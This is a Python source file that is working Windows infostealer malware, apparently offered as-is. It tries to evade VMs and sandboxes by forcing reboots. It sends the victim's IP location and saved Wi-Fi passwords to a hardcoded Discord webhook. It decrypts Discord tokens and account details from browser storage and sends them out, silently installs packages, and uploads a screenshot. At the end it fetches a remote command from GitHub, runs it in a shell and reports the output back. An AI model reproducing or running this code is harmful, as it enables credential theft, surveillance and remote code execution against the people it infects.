import sys
def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
def invenv(): 
    return get_base_prefix_compat() != sys.prefix
if invenv() == True: sys.exit()
import ctypes,os
class AntiVM:
    def __init__(self):
        self.drivers()
        self.Regcheck()
        self.VMcontrol()
    def drivers(self):
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmci.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if  os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmsci.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmusbmouse.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmx_svga.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
    def Regcheck(self):
        R = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        R2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if R != 1 and R2 != 1:
            os.system("shutdown /r /t 1")
            os._exit(1)
    def VMcontrol(self):    
        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))
        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            os.system("shutdown /r /t 1")
            os._exit(1)      
        if os.path.exists(os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists(os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")):
            os.system("shutdown /r /t 1")
            os._exit(1)
        try:
            ctypes.cdll.LoadLibrary("SbieDll.dll")
            os.system("shutdown /r /t 1")
            os._exit(1)
        except:pass
c = AntiVM
import re, subprocess
import getpass;user=getpass.getuser()
from discord import SyncWebhook
hook = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM"
class Network:

    def __init__(self):
        self.WiFi()

    def IP(self):
        con = requests.get("http://ipinfo.io/json").json()
        self.ip = f"``{con['ip']}``"
        try:
            self.hostname = f"``{con['hostname']}``"
        except:self.hostname = ":x:"
        self.city = f"``{con['city']}``"
        self.region = f"``{con['region']}``"
        self.country = f"``{con['country']}``"
        self.location = f"``{con['loc']}``"
        self.ISP = f"``{con['org']}``"

    def WiFi(self):
        self.IP()
        webhook1 = SyncWebhook.from_url(url=hook)
        webhook1.send(f"IP : {self.ip}\nHostname: {self.hostname}\nCity: {self.city}\nRegion: {self.region}\nCountry: {self.country}\nLocation: {self.location}\nISP: {self.ISP}")
        try:
            networks = re.findall(r"(?:Profile\s*:\s)(.*)", subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace"))
            for nets in networks:
                nets = nets.replace("\\r\\n","")
                res = subprocess.check_output(f"netsh wlan show profile {nets} key=clear",shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace")
                ssid = res.split("Type")[1].split(":")[1].split("\n")[0].split("\r")[0]
                key = res.split("Key Content")[1].split(":")[1].split("\n")[0].split("\r")[0]
                webhook = SyncWebhook.from_url(url=hook)
                webhook.send(f"Wifi Network Found : ``{nets}`` \nSSID: ``{ssid}``\nPassword: ``{key}``")
        except:pass

c = Network()
try:
    import time;from base64 import b64decode;from Crypto.Cipher import AES;from win32crypt import CryptUnprotectData;from os import listdir;from json import loads;from re import findall;from urllib.request import Request, urlopen;import requests;import json
except ImportError as e:
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', e.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        os.system('pip install pycryptodome pypiwin32 requests')
time.sleep(3)
def decrypt(buff, master_key):
    try:return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:return "Error"
def main():
        tokens = [];list2 = [];list3 = [];list4 = [];paths = {'Discord': os.getenv('APPDATA') + r'\\discord','Discord Canary': os.getenv('APPDATA') + r'\\discordcanary','Lightcord': os.getenv('APPDATA') + r'\\Lightcord','Discord PTB': os.getenv('APPDATA') + r'\\discordptb','Opera': os.getenv('APPDATA') + r'\\Opera Software\\Opera Stable','Opera GX': os.getenv('APPDATA') + r'\\Opera Software\\Opera GX Stable','Amigo': os.getenv('LOCALAPPDATA') + r'\\Amigo\\User Data','Torch': os.getenv('LOCALAPPDATA') + r'\\Torch\\User Data','Kometa': os.getenv('LOCALAPPDATA') + r'\\Kometa\\User Data','Orbitum': os.getenv('LOCALAPPDATA') + r'\\Orbitum\\User Data','CentBrowser': os.getenv('LOCALAPPDATA') + r'\\CentBrowser\\User Data','7Star': os.getenv('LOCALAPPDATA') + r'\\7Star\\7Star\\User Data','Sputnik': os.getenv('LOCALAPPDATA') + r'\\Sputnik\\Sputnik\\User Data','Vivaldi': os.getenv('LOCALAPPDATA') + r'\\Vivaldi\\User Data\\Default','Chrome SxS': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome SxS\\User Data','Chrome': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome\\User Data\\Default','Epic Privacy Browser': os.getenv('LOCALAPPDATA') + r'\\Epic Privacy Browser\\User Data','Microsoft Edge': os.getenv('LOCALAPPDATA') + r'\\Microsoft\\Edge\\User Data\\Defaul','Uran': os.getenv('LOCALAPPDATA') + r'\\uCozMedia\\Uran\\User Data\\Default','Yandex': os.getenv('LOCALAPPDATA') + r'\\Yandex\\YandexBrowser\\User Data\\Default','Brave': os.getenv('LOCALAPPDATA') + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Iridium': os.getenv('LOCALAPPDATA') + r'\\Iridium\\User Data\\Default'};ip = str(requests.get("http://ipinfo.io/json").json()["ip"])
        for platform, path in paths.items():
            if not os.path.exists(path): continue
            try:
                 with open(path + f"\\Local State", "r") as file:key = loads(file.read())['os_crypt']['encrypted_key'];file.close()
            except: continue
            for file in listdir(path + f"\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and file.endswith(".log"): continue
                else:
                    try:
                        with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):tokens.append(values)
                    except PermissionError: continue
            for i in tokens:
                if i.endswith("\\"):i.replace("\\", "")
                elif i not in list2:list2.append(i)
            for token in list2:
                try: tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                except IndexError == "Error":continue
                list4.append(tok)
                for value in list4:
                    if value not in list3:list3.append(value);headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try: res = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:res_json = res.json();pc_username = os.getenv("UserName");pc_name = os.getenv("COMPUTERNAME");user_name = f'{res_json["username"]}#{res_json["discriminator"]}';user_id = res_json['id'];email = res_json['email'];phone = res_json['phone'];mfa_enabled = res_json['mfa_enabled'];res = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers);embed = f"""```\nPC_USERNAME: {pc_username}\nPC_NAME: {pc_name}\nUSERNAME: {user_name}\nUSER_ID: {user_id}\nEMAIL: {email}\nPHONE: {phone}MFA: {mfa_enabled}\nTOKEN: {tok}'\nIP: {ip}\nPLATFORM: {platform}```""";payload = json.dumps({'content': embed})
                    try:
                        headers2 = {'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                        try:
                            req = Request(hook, data=payload.encode(), headers=headers2);res=urlopen(req)
                            if res.getcode() == 200 or 204:return
                            else:continue
                        except:pass
                    except: continue    
                else: continue
main()

def ss():
        import time
        from mss import mss
        envtemp = os.getenv('TEMP')
        temp = os.path.join(envtemp + "\\\\monitor.png")
        with mss() as sct:
            sct.shot(output=temp)
        fpath = envtemp + "\\monitor.png"
        with open(temp, 'rb') as f:
            files = {'file': (fpath, f, 'image/png')}
            requests.post(hook,files=files)
        time.sleep(2)
        os.remove(fpath)
ss()
def shl():
    re = requests.get("https://raw.githubusercontent.com/dd44aa/test/refs/heads/main/file.txt").text
    output = subprocess.run(re, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    requests.post(hook,json={"content": f"```A command has been executed```\n{output}"})
shl()
